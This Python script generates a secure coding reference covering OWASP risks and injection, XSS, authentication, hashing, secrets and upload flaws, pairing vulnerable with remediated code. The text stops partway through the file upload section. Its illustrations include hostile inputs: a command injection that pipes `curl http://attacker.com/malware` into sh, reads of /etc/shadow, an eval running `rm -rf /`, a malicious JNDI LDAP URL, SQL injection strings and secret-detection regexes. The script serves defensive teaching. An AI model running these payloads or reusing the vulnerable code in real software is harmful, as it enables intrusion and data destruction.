"""Generate the comprehensive Secure Coding Knowledge Base.

This module populates knowledge_base/secure_coding_knowledge_base.md
with in-depth, rigorous educational material covering all 25 required topics.
Each topic includes:
- Conceptual foundations and risk analysis
- Real-world vulnerability case studies and CVEs
- Common weaknesses (CWE mappings)
- Vulnerable Python and Java code examples
- Secure remediations and architectural patterns
- Static code review guidelines and heuristics
"""

import os
from pathlib import Path

def generate_knowledge_base(output_path: Path):
    sections = []

    # Title & Metadata
    sections.append("""# Secure Coding and Software Assurance Knowledge Base

## Comprehensive Engineering Reference Guide
**Domain**: Application Security, Static Code Analysis, and Secure Software Development Lifecycle (SSDLC)
**Audience**: Software Engineers, Cybersecurity Analysts, and AI Code Review Agents
**Scope**: Python and Java Web Applications, APIs, and Distributed Systems
**Standards Reference**: OWASP Top 10 (2021/2025), CWE/SANS Top 25, NIST SP 800-53, SEI CERT Coding Standards
**Authoritative Index**: Includes complete code remediation patterns, static analysis heuristics, and verification guides.

---
""")

    # Section 1
    sections.append("""## 1. Secure Coding Fundamentals

### 1.1 Core Principles of Secure Software Engineering
Building secure software requires treating security as a non-functional requirement embedded throughout the lifecycle rather than an afterthought. The foundational triad of information security consists of Confidentiality, Integrity, and Availability (CIA):
- **Confidentiality**: Ensuring sensitive information is accessible solely to authorized entities. Breaches occur through cleartext storage, unauthorized access, or excessive verbose logging. Data classification models (Public, Internal, Confidential, Restricted) should drive encryption and masking policies.
- **Integrity**: Protecting data and system state against unauthorized tampering, alteration, or fabrication. Integrity violations manifest as unsafe deserialization, insecure parameter tampering, and unauthenticated writes. Cryptographic hashing (HMAC, SHA-256) and digital signatures ensure message integrity.
- **Availability**: Guaranteeing dependable and timely access to services and data for legitimate users. Denial-of-service (DoS) vulnerabilities stem from unbounded resource consumption, algorithmic complexity attacks (e.g., ReDoS), or unhandled exceptions crashing workers.

### 1.2 Defense-in-Depth and Principle of Least Privilege
- **Defense-in-Depth**: Implement multiple concentric layers of defensive controls. If perimeter network firewalls fail, application-level authentication must withstand the threat. If authentication is bypassed, fine-grained object-level authorization and row-level database security must prevent unauthorized transactions.
- **Principle of Least Privilege (PoLP)**: Every module, service account, and end user must operate using the minimal set of privileges required to perform their intended function. Web application database connections must never connect as superuser `sa` or `postgres`; instead, dedicated service accounts with restricted SELECT, INSERT, UPDATE grants on specific tables should be enforced.
- **Fail-Secure Defaults**: Systems must default to a secure state when exceptions arise. If an authorization evaluation throws an unexpected exception, access must be denied by default rather than permitted.
- **Economy of Mechanism**: Keep security mechanisms simple and transparent. Complex designs are harder to verify and maintain, increasing the likelihood of configuration oversights.
- **Complete Mediation**: Every access to every object must be checked for authorization, avoiding caching permissions in mutable client-side cookies or trusting client identity parameters.

### 1.3 Threat Modeling and Attack Surface Reduction
- **STRIDE Methodology**: Categorize threats into Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, and Elevation of Privilege.
  - *Spoofing*: Impersonating a user or system (mitigated by robust authentication and TLS mutual auth).
  - *Tampering*: Modifying data on disk or in transit (mitigated by integrity checks, signatures, and input validation).
  - *Repudiation*: Denying an action took place (mitigated by append-only, tamper-evident audit logs).
  - *Information Disclosure*: Leaking internal state or secrets (mitigated by encryption and minimal error handling).
  - *Denial of Service*: Degenerating system throughput (mitigated by rate limiting, timeouts, and resource caps).
  - *Elevation of Privilege*: Gaining unauthorized rights (mitigated by strict RBAC/ABAC authorization checks).
- **Attack Surface Minimization**: Disable unused HTTP methods, decommission dead endpoints, remove debug routes prior to production deployment, and restrict public exposure of internal administrative microservices.

### 1.4 Code Review Checklist for Secure Fundamentals
1. Are default credentials, administrative bypass flags, or mock debug credentials disabled in production code?
2. Does the application enforce strict separation of duties and minimum necessary privileges for all components?
3. Does error handling fail closed, denying access when unexpected conditions or system exceptions occur?
4. Are security controls implemented consistently on the server side, never relying solely on client-side enforcement?
5. Are all incoming inputs validated against strict structural criteria before any business logic processes them?
6. Is all sensitive data encrypted in transit using TLS 1.3 and at rest using authenticated AES-256-GCM?
""")

    # Section 2
    sections.append("""## 2. OWASP Top 10 Concepts

### 2.1 Overview of Modern Vulnerability Classifications
The Open Web Application Security Project (OWASP) Top 10 documents the most critical security risks facing modern web applications. Understanding these classifications enables static review agents to map patterns to formal risk categories:

- **A01:2021 - Broken Access Control**: Unauthorized elevation of privilege, insecure direct object references (IDOR), bypassing CORS policies, and unauthenticated administrative routes. Attackers act outside their intended permissions.
- **A02:2021 - Cryptographic Failures**: Transmission of sensitive data in cleartext (HTTP/FTP), utilization of outdated hash functions (MD5, SHA-1), hardcoded symmetric keys, and improper IV generation.
- **A03:2021 - Injection**: SQL, NoSQL, OS Command, LDAP, and Expression Language injection where untrusted input is concatenated into query interpreters. Attackers manipulate the control plane.
- **A04:2021 - Insecure Design**: Architecture flaws where business logic fails to enforce threat-resistant constraints (e.g., absence of rate limiting on password reset flows, unauthenticated file download mechanisms).
- **A05:2021 - Security Misconfiguration**: Default accounts enabled, verbose stack traces displayed to end-users, missing security headers (`Content-Security-Policy`, `X-Content-Type-Options`), unneeded ports open.
- **A06:2021 - Vulnerable and Outdated Components**: Relying on unpinned, end-of-life, or known vulnerable libraries (CVEs) without automated dependency tracking or continuous vulnerability management.
- **A07:2021 - Identification and Authentication Failures**: Weak password policies, vulnerable session management, lack of multi-factor authentication, or predictable session identifiers allowing credential stuffing.
- **A08:2021 - Software and Data Integrity Failures**: Insecure CI/CD pipelines, untrusted auto-updates, and deserialization of untrusted payloads leading to remote code execution (e.g., SolarWinds, Log4Shell).
- **A09:2021 - Security Logging and Monitoring Failures**: Failure to log audit-worthy events (logins, privilege escalations, financial transactions) or failure to alert on suspicious anomalies, delaying breach detection.
- **A10:2021 - Server-Side Request Forgery (SSRF)**: Web application fetching remote resources from user-supplied URLs without restricting internal metadata addresses (e.g., cloud metadata `169.254.169.254`).

### 2.2 Shift-Left Security Integration
Integrating automated static analysis into pre-commit hooks and CI/CD pipelines ensures that OWASP Top 10 risks are identified at code commit time, radically reducing remediation costs compared to late runtime penetration testing.
- **Cost of Remediation Curve**: A vulnerability identified during coding costs up to 30x less to remediate than one discovered in production.
- **Automated Quality Gates**: Enforce zero-tolerance build breaking for Critical and High severity findings.
- **Security Champions**: Pair development teams with designated security engineers who triage and verify SAST reports.
""")

    # Section 3
    sections.append("""## 3. Python Secure Coding

### 3.1 Python Language Peculiarities and Threat Vectors
Python's dynamic nature, rich introspection capabilities, and expressive syntax introduce unique security considerations:
- Dynamic execution functions (`eval()`, `exec()`, `compile()`) execute arbitrary Python bytecode strings.
- Dynamic attribute access via `getattr()`, `setattr()`, and `__dict__` manipulation can enable template injection and privilege escalation.
- Duck typing and implicit type coercion can introduce subtle logic bypasses when inputs are not strictly validated.
- Global Interpreter Lock (GIL) and process-based concurrency patterns necessitate care with shared memory and race conditions.

### 3.2 Dangerous Built-in Functions and Modules
- **`eval()` and `exec()`**: Executing strings constructed from user input allows attackers to invoke `__import__('os').system('sh')`.
- **`pickle` and `shelve`**: The pickle protocol executes arbitrary callable objects defined in the serialized byte stream via `__reduce__`.
- **`subprocess` with `shell=True`**: Spawns an underlying system shell (`/bin/sh` or `cmd.exe`), causing metacharacters like `;`, `&&`, and `|` to execute arbitrary commands.
- **`assert` statements for authorization**: Assertions are optimized away when Python is invoked with the `-O` (optimize) flag, bypassing security checks entirely.
- **`input()` in Python 2 vs Python 3**: Python 2's `input()` evaluated expressions as code. Python 3 returns strings, but legacy habits sometimes reintroduce dynamic evaluations.
- **`tempfile.mktemp()`**: Deprecated function susceptible to race conditions (TOCTOU). Use `tempfile.NamedTemporaryFile()` instead.

### 3.3 Vulnerable Python Code Example
```python
# VULNERABLE: Using eval on user-controlled input
def calculate_user_expression(user_input: str):
    # Attacker payload: __import__('os').system('rm -rf /')
    result = eval(user_input)
    return result

# VULNERABLE: Relying on assert for security logic
def access_admin_dashboard(user):
    assert user.is_admin, "Access Denied"  # Bypassed when run with 'python -O'
    return render_admin_panel()

# VULNERABLE: Mutable default argument leading to shared state across sessions
def track_request(session_id: str, history: list = []):
    history.append(session_id)
    return history
```

### 3.4 Remediated Python Code Example
```python
import ast
import operator
from typing import List, Optional

# SECURE: Safe mathematical expression evaluation using AST parsing
SAFE_OPERATORS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
    ast.USub: operator.neg,
}

def safe_calculate(expr_str: str):
    node = ast.parse(expr_str, mode='eval').body
    def _eval(node):
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        elif isinstance(node, ast.BinOp) and type(node.op) in SAFE_OPERATORS:
            return SAFE_OPERATORS[type(node.op)](_eval(node.left), _eval(node.right))
        elif isinstance(node, ast.UnaryOp) and type(node.op) in SAFE_OPERATORS:
            return SAFE_OPERATORS[type(node.op)](_eval(node.operand))
        raise ValueError(f"Unsupported syntax or unsafe operation: {type(node).__name__}")
    return _eval(node)

# SECURE: Explicit conditional branch raising standard exception
def access_admin_dashboard_secure(user):
    if not getattr(user, "is_admin", False):
        raise PermissionError("Access forbidden: Administrator privileges required")
    return render_admin_panel()

# SECURE: Immutable default using None sentinel
def track_request_secure(session_id: str, history: Optional[List[str]] = None) -> List[str]:
    if history is None:
        history = []
    history.append(session_id)
    return history
```

### 3.5 Python Static Analysis Heuristics
- Flag any use of `eval()`, `exec()`, or `compile()` where arguments are derived from parameters or non-literals.
- Flag any `assert` statement located in authorization checks or request validation branches.
- Flag `subprocess.Popen`, `subprocess.run`, `subprocess.call` having `shell=True`.
- Flag mutable default arguments (`def func(items=[]):`, `def func(cfg={}):`) which share state across user requests.
- Flag `tempfile.mktemp()` and recommend `tempfile.NamedTemporaryFile()`.
- Flag usage of `yaml.load()` without specifying `Loader=yaml.SafeLoader`.
""")

    # Section 4
    sections.append("""## 4. Java Secure Coding

### 4.1 JVM Memory Safety, Type Safety, and Security Architecture
While Java provides memory safety through automated garbage collection and bounds-checked array access, web applications running on the JVM remain vulnerable to logical flaws, deserialization exploits, class-loader manipulation, and injection attacks.
- Strongly typed language with bytecode verification prevents buffer overflows at the machine level.
- Java Security Manager (deprecated in modern JDKs) historically enforced sandboxing, but application-level defensive programming remains the paramount line of defense.
- Thread management and concurrency require synchronized structures or `java.util.concurrent` atomic primitives to avoid race conditions.

### 4.2 Key Pitfalls in Enterprise Java Applications
- **Reflection Abuse**: Unrestricted use of `Class.forName()`, `Method.invoke()`, and `Field.setAccessible(true)` can bypass encapsulation and invoke dangerous internal routines.
- **Object Serialization**: Implementing `java.io.Serializable` without overriding `readObject()` with safe look-ahead object filters permits gadget-chain remote code execution.
- **XML External Entity (XXE)**: Default `DocumentBuilderFactory` and `SAXParserFactory` instances resolve external DOCTYPE declarations, reading local files (`/etc/passwd`) or triggering SSRF.
- **Uncontrolled JNDI Lookups**: Passing user input into `InitialContext.lookup()` allows remote code injection (the root cause of Log4Shell - CVE-2021-44228).
- **Hardcoded Cryptographic Keys**: Embedding `SecretKeySpec` with static string bytes in class bytecode readable via decompilers.

### 4.3 Vulnerable Java Code Example
```java
// VULNERABLE: Insecure XML Parsing susceptible to XXE Injection
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.InputStream;

public class XMLParserService {
    public Document parseUserData(InputStream xmlStream) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Missing disallow-doctype-decl feature!
        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(xmlStream);
    }
}
```

```java
// VULNERABLE: Direct JNDI Lookup with User Input
import javax.naming.InitialContext;

public class JNDIService {
    public Object lookupResource(String resourceName) throws Exception {
        InitialContext ctx = new InitialContext();
        // Attacker passes: ldap://malicious.com/exploit
        return ctx.lookup(resourceName);
    }
}
```

### 4.4 Remediated Java Code Example
```java
// SECURE: Disabling DTDs and External Entities
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.InputStream;

public class SecureXMLParserService {
    public Document parseUserData(InputStream xmlStream) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Explicitly disable external DTDs and entities
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        
        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(xmlStream);
    }
}
```

### 4.5 Java Static Analysis Heuristics
- Detect instantiations of `DocumentBuilderFactory`, `SAXParserFactory`, and `XMLInputFactory` lacking security feature flags.
- Inspect `ObjectInputStream.readObject()` invocations that lack `ObjectInputFilter`.
- Flag string concatenation inside SQL `Statement.executeQuery()` and `Connection.prepareStatement()`.
- Flag usage of `Runtime.getRuntime().exec(String command)` without argument array tokenization.
- Flag calls to `InitialContext.lookup()` where the argument is derived from HTTP request parameters.
""")

    # Section 5
    sections.append("""## 5. SQL Injection and Parameterized Queries

### 5.1 Anatomy of SQL Injection (CWE-89)
SQL Injection occurs when untrusted user input is directly concatenated, formatted, or interpolated into dynamic database query strings. The database SQL engine interprets the input characters (e.g., `' OR '1'='1`, `'; DROP TABLE users; --`) as executable syntax rather than literal data parameters.
- **Root Cause**: Failure to separate code (the SQL statement structure) from data (the variable values supplied by users).
- **Severity**: Critical (CVSS 9.0 - 10.0). Results in full database exfiltration, credential theft, data destruction, and potential remote OS shell via database extensions.

### 5.2 Attack Vectors and Impact
- **In-Band SQLi (Classic)**: The attacker uses the same channel to launch the attack and gather results (e.g., Error-based SQLi where error messages leak database schema, or UNION-based SQLi where extra rows are returned).
- **Inferential SQLi (Blind)**: No data is directly printed on screen. The attacker asks true/false questions via Boolean conditions (`AND 1=1`) or Time-delay commands (`pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`).
- **Out-of-Band SQLi**: Triggering DNS or HTTP requests from the database server to an attacker-controlled listener to exfiltrate results.

### 5.3 Vulnerable Python and Java Examples
```python
# VULNERABLE Python: Dynamic string interpolation in SQLite
import sqlite3

def query_user_vulnerable(username: str, cursor: sqlite3.Cursor):
    # Injection payload: "' OR '1'='1"
    query = f"SELECT id, role, email FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()
```

```java
// VULNERABLE Java: Dynamic SQL concatenation
import java.sql.*;

public class UserDAO {
    public ResultSet getUser(Connection conn, String accountId) throws SQLException {
        Statement stmt = conn.createStatement();
        String sql = "SELECT * FROM accounts WHERE id = '" + accountId + "'";
        return stmt.executeQuery(sql);
    }
}
```

### 5.4 Secure Remediation with Parameterized Queries
```python
# SECURE Python: Parameterized query binding
import sqlite3

def query_user_secure(username: str, cursor: sqlite3.Cursor):
    query = "SELECT id, role, email FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchall()
```

```java
// SECURE Java: Using PreparedStatement with type-safe parameter binding
import java.sql.*;

public class SecureUserDAO {
    public ResultSet getUser(Connection conn, String accountId) throws SQLException {
        String sql = "SELECT * FROM accounts WHERE id = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, accountId);
        return pstmt.executeQuery();
    }
}
```

### 5.5 ORM Considerations and Heuristic Rules
- Object-Relational Mappers (ORMs) like SQLAlchemy, Django ORM, and Hibernate protect against SQLi when used conventionally, but raw SQL escapes (e.g., `text()` in SQLAlchemy or `entityManager.createNativeQuery()`) remain vulnerable if combined with string formatting.
- **Rule SQL-01**: Never use f-strings, `format()`, or `%` formatting to build SQL strings.
- **Rule SQL-02**: Always use positional (`?`) or named (`:param`) bind markers.
- **Rule SQL-03**: Validate table and column names against a strict whitelist when building dynamic order-by clauses, since bind parameters cannot be used for schema identifiers.
""")

    # Section 6
    sections.append("""## 6. Cross-Site Scripting (XSS)

### 6.1 Vulnerability Mechanisms and Classifications (CWE-79)
Cross-Site Scripting happens when an application includes untrusted data in an HTTP response sent to a browser without proper context-aware sanitization or output encoding.
- **Stored XSS (Persistent)**: Malicious script is permanently stored in database comments, profiles, or logs and executed whenever any user views the infected record. Highest severity XSS.
- **Reflected XSS (Non-Persistent)**: Malicious script payload is reflected off a web server within an immediate error message, search result, or parameter response, requiring victim interaction (clicking a phishing link).
- **DOM-based XSS**: Malicious data flows entirely on the client side from a source (e.g., `location.search`, `location.hash`) to a sink (e.g., `element.innerHTML`, `document.write`, `eval`).

### 6.2 Vulnerable Web Implementation
```python
# VULNERABLE Flask: Direct string formatting returning unescaped HTML
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Vulnerable: Reflecting input directly into HTML response
    return f"<h2>Search results for: {query}</h2>"
```

```javascript
// VULNERABLE JavaScript DOM XSS
function displayGreeting() {
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");
    // DOM sink: innerHTML parses HTML tags and script elements!
    document.getElementById("greeting").innerHTML = "Hello " + name;
}
```

### 6.3 Secure Remediation Strategies
1. **Context-Aware Output Encoding**: HTML entity encode (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`) before rendering within HTML body; JavaScript encode before placing inside script blocks; URL encode inside href attributes.
2. **Template Engines**: Rely on Jinja2's autoescaping mechanism and avoid using the `| safe` filter on user input.
3. **Safe DOM Manipulation**: In client-side JavaScript, use `textContent` or `innerText` instead of `innerHTML`.
4. **Content Security Policy (CSP)**: Deploy strict HTTP headers restricting script sources and disabling `unsafe-inline` and `eval`.

```python
# SECURE Flask: Using template auto-escaping and explicit escaping
from flask import Flask, request, render_template, escape

app = Flask(__name__)

@app.route("/search")
def search():
    query = request.args.get("q", "")
    # Secure: Let Jinja2 template autoescape variables or use html.escape
    safe_query = str(escape(query))
    return render_template("search_results.html", query=safe_query)
```

```javascript
// SECURE JavaScript: textContent prevents HTML tag interpretation
function displayGreetingSecure() {
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name") || "Guest";
    document.getElementById("greeting").textContent = "Hello " + name;
}
```

### 6.4 Static Analysis Detection Rules
- Flag any use of `| safe` in Jinja2 templates where the bound variable originates from user request data.
- Flag string concatenation inside Flask responses without explicit escaping or template rendering.
- Flag client-side assignments to `innerHTML`, `outerHTML`, or `document.write()`.
- Check for presence of `HttpOnly` and `SameSite` flags on authentication cookies to mitigate session theft.
""")

    # Section 7
    sections.append("""## 7. Command Injection

### 7.1 Operating System Command Execution Risks (CWE-78)
Command Injection arises when an application concatenates untrusted input into shell command strings passed to operating system command interpreters (`sh`, `bash`, `cmd.exe`, `powershell.exe`).

### 7.2 Exploitation Mechanics
An attacker uses shell metacharacters (`&`, `&&`, `;`, `|`, `||`, backticks, `$()`, newline `\\n`) to append arbitrary commands.
For example, a ping utility expecting an IP address receives: `8.8.8.8; cat /etc/shadow` or `127.0.0.1 && curl http://attacker.com/malware | sh`.
This grants the attacker arbitrary code execution with the permissions of the web server worker process.

### 7.3 Vulnerable Python and Java Examples
```python
# VULNERABLE Python: Invoking shell with string concatenation
import os
import subprocess

def ping_host_vulnerable(hostname: str):
    # Shell executes anything after ';'
    os.system("ping -c 1 " + hostname)
    subprocess.call(f"nslookup {hostname}", shell=True)
```

```java
// VULNERABLE Java: Invoking Runtime.exec with unsanitized string
public class NetworkDiagnostic {
    public void runTrace(String target) throws Exception {
        Runtime.getRuntime().exec("traceroute " + target);
    }
}
```

### 7.4 Remediated Secure Implementations
```python
# SECURE Python: Passing argument lists and shell=False
import subprocess
import ipaddress

def ping_host_secure(hostname: str):
    # Validate strictly as an IP address
    try:
        ip = str(ipaddress.ip_address(hostname))
    except ValueError:
        raise ValueError("Invalid IP address format")

    # Command and arguments passed as discrete elements of a list; shell=False
    result = subprocess.run(
        ["ping", "-c", "1", ip],
        capture_output=True,
        text=True,
        timeout=5,
        shell=False,
        check=True
    )
    return result.stdout
```

```java
// SECURE Java: ProcessBuilder with discrete arguments
import java.util.List;

public class SecureNetworkDiagnostic {
    public void runTrace(String target) throws Exception {
        // Enforce strict whitelist validation (alphanumeric and dot)
        if (!target.matches("^[a-zA-Z0-9.-]+$")) {
            throw new IllegalArgumentException("Invalid target format");
        }
        ProcessBuilder pb = new ProcessBuilder("traceroute", target);
        pb.redirectErrorStream(true);
        Process process = pb.start();
        process.waitFor();
    }
}
```

### 7.5 Review Heuristics for Command Execution
- Flag any invocation of `os.system()`, `os.popen()`, `subprocess.Popen(..., shell=True)`.
- Verify that `ProcessBuilder` or `subprocess.run` receives an immutable list of arguments, not a formatted string.
- Require strict input whitelisting before any system binary invocation.
- Recommend built-in programming language APIs (e.g., Python's `socket` or `os` modules) over calling out to external shell commands.
""")

    # Section 8
    sections.append("""## 8. Authentication and Authorization

### 8.1 Distinction Between Identity and Permission (CWE-287, CWE-285)
- **Authentication (AuthN)**: Verifying that an actor is indeed who they claim to be (e.g., verifying credentials, MFA tokens, certificates). Answers "Who are you?".
- **Authorization (AuthZ)**: Determining whether a verified actor possesses permission to access a specific resource or perform a specific operation. Answers "What are you allowed to do?".

### 8.2 Insecure Direct Object Reference (IDOR) / BOLA
Broken Object Level Authorization occurs when an application exposes a reference to an internal resource (such as a database primary key or UUID) and fails to verify that the authenticated requester owns or is authorized to access that specific object.

```python
# VULNERABLE Flask IDOR: Missing ownership check
@app.route("/api/invoice/<int:invoice_id>")
@login_required
def get_invoice(invoice_id):
    # Anyone who is logged in can view ANY invoice by guessing invoice_id!
    invoice = Invoice.query.get_or_404(invoice_id)
    return jsonify(invoice.to_dict())
```

### 8.3 Remediated Object-Level Authorization
```python
# SECURE Flask: Enforcing tenant/user ownership constraint
@app.route("/api/invoice/<int:invoice_id>")
@login_required
def get_invoice_secure(invoice_id):
    invoice = Invoice.query.filter_by(id=invoice_id, user_id=current_user.id).first()
    if not invoice and not current_user.has_role("BILLING_ADMIN"):
        abort(404)  # Return 404 to avoid leaking existence of resource
    return jsonify(invoice.to_dict())
```

### 8.4 Role-Based (RBAC) and Attribute-Based Access Control (ABAC)
- Enforce access control centrally via decorators, filters, or security interceptors rather than ad-hoc inline checks.
- Maintain consistent session invalidation upon password reset, logout, or privilege escalation.
- Prevent session fixation by issuing a new session ID immediately upon successful login.
- Guard against JWT vulnerabilities: verify signatures strictly, reject tokens with `alg: "none"`, and validate expiration (`exp`) and issuer (`iss`) claims.
""")

    # Section 9
    sections.append("""## 9. Password Storage and Hashing

### 9.1 Inadequacy of Fast Hashes (CWE-916)
General-purpose cryptographic hash functions such as MD5, SHA-1, SHA-256, and SHA-512 are designed for high throughput and rapid verification of file integrity. Modern GPU and ASIC hardware can calculate billions of SHA-256 hashes per second, making fast hashes vulnerable to offline brute-force attacks and rainbow table lookups.

### 9.2 Key-Stretching Adaptive Algorithms
Secure credential storage mandates the use of memory-hard, computationally expensive, adaptive key-derivation functions:
- **Argon2id**: Recommended password hashing algorithm (winner of the Password Hashing Competition), offering resistance against GPU and side-channel attacks.
- **bcrypt**: Battle-tested adaptive hashing algorithm utilizing the Blowfish cipher with an adjustable work factor (salt rounds). Cost factor should be >= 12.
- **PBKDF2**: NIST-approved standard requiring at least 600,000 iterations for PBKDF2-HMAC-SHA256.
- **scrypt**: Memory-hard key derivation function specifically designed to make custom ASIC and FPGA hardware cracking economically infeasible.

### 9.3 Vulnerable vs. Secure Password Implementation
```python
# VULNERABLE: Storing password with plain SHA-256 without salt
import hashlib

def hash_password_vulnerable(password: str) -> str:
    # Vulnerable to rainbow tables and fast cracking
    return hashlib.sha256(password.encode("utf-8")).hexdigest()
```

```python
# SECURE: Using werkzeug.security (scrypt / PBKDF2) or argon2-cffi
from werkzeug.security import generate_password_hash, check_password_hash

def store_new_password(password: str) -> str:
    # Generates a cryptographically strong random salt and applies adaptive iterations
    return generate_password_hash(password, method="scrypt")

def verify_user_login(password: str, stored_hash: str) -> bool:
    # Constant-time comparison preventing timing attacks
    return check_password_hash(stored_hash, password)
```

```java
// SECURE Java: Using Spring Security BCryptPasswordEncoder
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class PasswordManager {
    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);

    public String hashPassword(String rawPassword) {
        return encoder.encode(rawPassword);
    }

    public boolean checkPassword(String rawPassword, String encodedHash) {
        return encoder.matches(rawPassword, encodedHash);
    }
}
```

### 9.4 Static Review Rules for Passwords
- Flag any usage of `hashlib.md5()`, `hashlib.sha1()`, or `MessageDigest.getInstance("MD5")` associated with passwords.
- Flag static, short, or shared salts.
- Require constant-time comparisons (`hmac.compare_digest`) for secret verification.
- Verify that password reset workflows issue high-entropy single-use tokens with short time-to-live (TTL <= 15 minutes).
""")

    # Section 10
    sections.append("""## 10. Secret and API-Key Management

### 10.1 Risks of Hardcoded Credentials (CWE-798)
Hardcoding passwords, API tokens, cryptographic private keys, database connection strings, or cloud access keys directly in source code exposes credentials to:
- Revision control history (Git commits, PRs, public forks).
- Client-side decompilation and inspection.
- Build artifacts, container images, and distributed binaries.
- Accidental disclosure in error logs and crash dumps.

### 10.2 Detection Signatures and Entropy Analysis
Static code analysis checks for secrets using both regular expression patterns and Shannon entropy metrics:
- AWS Access Key IDs: `AKIA[0-9A-Z]{16}`
- AWS Secret Keys: 40-character base64 strings.
- Generic API Keys: High-entropy hexadecimal or base64 strings assigned to variable names like `apiKey`, `token`, `secret`, `password`.
- Private Keys: `-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----`
- Google API Keys: `AIza[0-9A-Za-z-_]{35}`
- Slack Webhook URLs: `https://hooks.slack.com/services/T.../B.../...`

### 10.3 Vulnerable Hardcoded Credentials Example
```python
# VULNERABLE: Embedded database credentials and payment gateway tokens
DATABASE_URI = "YOUR_DATABASE_URI"
STRIPE_SECRET_KEY = "YOUR_STRIPE_SECRET_KEY"
JWT_SECRET = "super_secret_jwt_key_do_not_share"
```

### 10.4 Remediated Environment-Driven Configuration
```python
# SECURE: Loading secrets from environment variables or dedicated secret stores
import os
from dotenv import load_dotenv

load_dotenv()  # Loads .env file for local development (excluded via .gitignore)

DATABASE_URI = os.getenv("DATABASE_URI")
if not DATABASE_URI:
    raise RuntimeError("CRITICAL: DATABASE_URI environment variable is not configured.")

STRIPE_SECRET_KEY = os.getenv("STRIPE_SECRET_KEY")
JWT_SECRET = os.getenv("JWT_SECRET")
```

### 10.5 Secret Management Best Practices
- Never commit `.env`, `.pem`, or configuration files containing live secrets.
- Maintain a `.env.example` file populated with dummy placeholder variables.
- Employ secret vaults (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) for automated rotation.
- Integrate git pre-commit hooks (e.g., git-secrets, truffleHog, gitleaks) to block commits containing sensitive credentials.
""")

    # Section 11
    sections.append("""## 11. Input Validation and Output Encoding

### 11.1 The Dual Pillars of Input Handling (CWE-20, CWE-116)
- **Input Validation (Accept Known Good)**: Verify that all incoming data conforms strictly to expected formats, types, lengths, ranges, and character sets before processing.
- **Output Encoding (Neutralize for Context)**: Transform untrusted data into safe, inert formats when rendering or interpolating into downstream target contexts (HTML, SQL, Shell, JSON, XML).

### 11.2 Whitelisting vs. Blacklisting
Blacklisting (filtering out known bad strings like `'`, `<`, `>`, `script`) is fundamentally flawed because attackers evade filters using alternative encodings, unexpected casings, or novel syntax. Whitelisting (defining an exact schema of allowable characters, e.g., `^[a-zA-Z0-9_-]{3,32}$`) guarantees that only safe payloads are accepted.

### 11.3 Vulnerable Input Handling
```python
# VULNERABLE: Incomplete blacklist sanitization
def sanitize_comment_bad(text: str) -> str:
    # Trivial bypass: <SCRIPT> or <img src=x onerror=alert(1)>
    bad_tags = ["<script>", "</script>"]
    for tag in bad_tags:
        text = text.replace(tag, "")
    return text
```

### 11.4 Remediated Schema-Based Validation
```python
# SECURE: Strict validation using Pydantic or regular expression whitelists
import re
from pydantic import BaseModel, Field, EmailStr

class UserRegistrationModel(BaseModel):
    username: str = Field(..., min_length=3, max_length=32, pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    age: int = Field(..., ge=18, le=120)

def validate_phone_number(phone: str) -> str:
    pattern = r"^\+?[1-9]\d{1,14}$"  # E.164 international standard
    if not re.match(pattern, phone):
        raise ValueError("Invalid phone number format")
    return phone
```

### 11.5 Static Analysis Rules for Validation
- Identify endpoints accepting raw strings without type annotations or schema validators.
- Warn when blacklist string replacements (`replace("<script>", "")`) are detected.
- Ensure incoming numeric parameters are strictly cast to `int` or `float` before arithmetic or query usage.
""")

    # Section 12
    sections.append("""## 12. File Upload Security

### 12.1 Attack Vectors in File Handling (CWE-434)
Unrestricted file uploads expose web servers to severe exploitation:
- **Remote Code Execution**: Uploading server-side executable scripts (`.php`, `.py`, `.jsp`, `.asp`) into public directories executed by the web server.
- **Cross-Site Scripting (XSS)**: Uploading HTML or SVG files containing embedded `<script>` payloads rendered directly in victim browsers.
- **Zip Bomb / Disk Exhaustion**: Submitting heavily compressed archives that decompress into hundreds of gigabytes, exhausting disk storage.
- **MIME-Type Spoofing**: Supplying a malicious executable with a falsified `Content-Type: image/jpeg` header.

### 12.2 Vulnerable Upload Code
```python
# VULNERABLE: Direct file save using user-supplied filename
from flask import Flask, request
import os

app = Flask(__name__)
UPLOAD_DIR = "/var/www/uploads"

@app.route("/upload", methods=["POST"])
def upload_file():
    file = request.files["avatar"]
    # Path traversal and arbitrary execution vulnerability:
    # If filename is "../../etc/cron.d/malicious" or "shell.php"
    file.save(os.path.join(UPLOAD_DIR, file.filename))
    return "Uploaded successfully"
```

### 12.3 Remediated File Upload Architecture
```python
# SECURE: Whitelist validation, randomized UUID names, and secure directory
from flask import Flask, request, abort
import os
import uuid
